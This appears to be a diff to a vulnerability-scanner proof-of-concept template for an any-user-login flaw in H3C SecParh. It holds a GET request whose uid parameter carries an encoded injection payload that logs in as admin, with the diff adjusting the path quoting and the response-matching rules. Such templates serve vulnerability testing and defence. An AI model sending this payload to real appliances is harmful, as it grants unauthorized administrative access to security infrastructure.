@@ -1,9 +1,9 @@
 name: poc-yaml-h3c-secparh-any-user-login
 rules:
   - method: GET
-    path: "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin"
+    path: /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
     expression: |
-      response.status == 200 && ("错误的id".bmatches(response.body) || "审计管理员".bmatches(response.body))
+      response.status == 200 && "错误的id".bmatches(response.body) && "审计管理员".bmatches(response.body) && "admin".bmatches(response.body)
 detail:
   author: Print1n(https://print1n.top)
   links:
